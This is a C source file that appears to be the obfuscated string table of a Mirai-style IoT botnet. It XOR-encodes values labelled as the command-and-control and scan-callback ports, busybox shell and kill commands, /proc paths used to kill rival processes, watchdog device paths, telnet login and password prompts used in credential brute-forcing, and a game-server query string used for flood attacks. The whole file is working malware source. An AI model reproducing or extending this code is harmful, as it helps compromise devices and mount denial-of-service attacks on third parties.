#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0xdedefbaf;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    add_entry(TABLE_CNC_PORT, "\x51\x74", 2); // 1312
    add_entry(TABLE_SCAN_CB_PORT, "\x5B\x1C", 2); // 3912
    add_entry(TABLE_EXEC_SUCCESS, "\x17\x3B\x3A\x3A\x31\x37\x20\x31\x30\x74\x00\x3B\x74\x17\x1A\x17\x54", 17);
    add_entry(TABLE_SCAN_SHELL, "\x27\x3C\x31\x38\x38\x54", 6);
    add_entry(TABLE_SCAN_ENABLE, "\x31\x3A\x35\x36\x38\x31\x54", 7);
    add_entry(TABLE_SCAN_SYSTEM, "\x27\x2D\x27\x20\x31\x39\x54", 7);
    add_entry(TABLE_SCAN_SH, "\x27\x3C\x54", 3);
    add_entry(TABLE_SCAN_QUERY, "\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x07\x1B\x06\x15\x54", 18);
    add_entry(TABLE_SCAN_RESP, "\x07\x1B\x06\x15\x6E\x74\x35\x24\x24\x38\x31\x20\x74\x3A\x3B\x20\x74\x32\x3B\x21\x3A\x30\x54", 23);
    add_entry(TABLE_SCAN_NCORRECT, "\x3A\x37\x3B\x26\x26\x31\x37\x20\x54", 9);
    add_entry(TABLE_SCAN_PS, "\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x24\x27\x54", 16);
    add_entry(TABLE_SCAN_KILL_9, "\x7B\x36\x3D\x3A\x7B\x36\x21\x27\x2D\x36\x3B\x2C\x74\x3F\x3D\x38\x38\x74\x79\x6D\x74\x54", 22);
    add_entry(TABLE_KILLER_PROC, "\x7B\x24\x26\x3B\x37\x7B\x54", 7);
    add_entry(TABLE_KILLER_EXE, "\x7B\x31\x2C\x31\x54", 5);
    add_entry(TABLE_KILLER_FD, "\x7B\x32\x30\x54", 4);
    add_entry(TABLE_KILLER_MAPS, "\x7B\x39\x35\x24\x27\x54", 6);
    add_entry(TABLE_KILLER_TCP, "\x7B\x24\x26\x3B\x37\x7B\x3A\x31\x20\x7B\x20\x37\x24\x54", 14);
	add_entry(TABLE_KILLER_STATUS, "\x7B\x27\x20\x35\x20\x21\x27\x54", 8);
	add_entry(TABLE_KILLER_ANIME, "\x7A\x35\x3A\x3D\x39\x31\x54", 7);
    add_entry(TABLE_MEM_ROUTE, "\x7B\x24\x26\x3B\x37\x7B\x3A\x31\x20\x7B\x26\x3B\x21\x20\x31\x54", 16);
	add_entry(TABLE_MEM_ASSWD, "\x35\x27\x27\x23\x3B\x26\x30\x54", 8);
    add_entry(TABLE_ATK_VSE, "\x00\x07\x3B\x21\x26\x37\x31\x74\x11\x3A\x33\x3D\x3A\x31\x74\x05\x21\x31\x26\x2D\x54", 21);
    add_entry(TABLE_ATK_RESOLVER, "\x7B\x31\x20\x37\x7B\x26\x31\x27\x3B\x38\x22\x7A\x37\x3B\x3A\x32\x54", 17);
    add_entry(TABLE_ATK_NSERV, "\x3A\x35\x39\x31\x27\x31\x26\x22\x31\x26\x74\x54", 12);
	add_entry(TABLE_MISC_WATCHDOG, "\x7B\x30\x31\x22\x7B\x23\x35\x20\x37\x3C\x30\x3B\x33\x54", 14);
	add_entry(TABLE_MISC_WATCHDOG2, "\x7B\x30\x31\x22\x7B\x39\x3D\x27\x37\x7B\x23\x35\x20\x37\x3C\x30\x3B\x33\x54", 19);
	add_entry(TABLE_SCAN_ASSWORD, "\x24\x36\x36\x32\x2A\x37\x21\x45", 8);
	add_entry(TABLE_SCAN_OGIN, "\x3B\x33\x3D\x3A\x54", 5);
	add_entry(TABLE_SCAN_ENTER, "\x31\x3A\x20\x31\x26\x54", 6);
	add_entry(TABLE_MISC_RAND, "\x65\x33\x36\x35\x60\x37\x30\x3B\x39\x61\x67\x3A\x3C\x24\x65\x66\x31\x3D\x64\x3F\x32\x3E\x54", 23);
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[table] Tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}

